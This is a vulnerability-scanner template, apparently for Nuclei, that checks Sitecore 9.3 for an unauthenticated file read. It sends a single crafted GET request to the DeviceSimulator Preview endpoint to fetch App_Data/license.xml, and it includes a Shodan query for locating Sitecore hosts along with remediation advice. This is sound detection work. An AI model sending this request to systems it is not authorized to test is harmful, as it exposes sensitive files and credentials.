id: sitecore-lfi

info:
  name: Sitecore 9.3 Webroot 文件 读取
  author: DhiyaneshDK
  severity: high
  description: |
    该模板用于核查 Sitecore 9.3 Webroot 文件 读取。该类问题通常源于文件上传、文件读取或路径访问控制配置不当，导致攻击者可读取敏感文件或上传非预期内容。模板会向目标发送探测请求，并依据匹配 `<signedlicense id=`、匹配 `<Signature`、状态码 200 等证据确认目标是否存在该配置问题。
  impact: |
    - 攻击者可能读取配置、源码、凭据或系统文件，或上传可被服务器解析的恶意文件。
    - 成功利用后可能造成敏感信息泄露、站点篡改、远程代码执行或持久化入口。
  remediation: |
    - 为文件读取和上传接口增加严格认证授权与路径约束。
    - 限制上传文件类型、扩展名、大小和存储位置，禁止上传目录执行脚本。
    - 审计已上传文件和访问日志，移除异常文件并轮换可能泄露的凭据。
  reference:
    - https://blog.assetnote.io/2023/05/10/sitecore-round-two/
  classification:
    cwe-id: CWE-22,CWE-73
  metadata:
    verified: true
    max-request: 1
    shodan-query: title:"Sitecore"
  tags: sitecore,lfi,misconfig,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/sitecore/Sitecore.Mvc.DeviceSimulator.Controllers.SimulatorController,Sitecore.Mvc.DeviceSimulator.dll/Preview?previewPath=/App_Data/license.xml"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<signedlicense id="
          - "<Signature"
        condition: and

      - type: status
        status:
          - 200
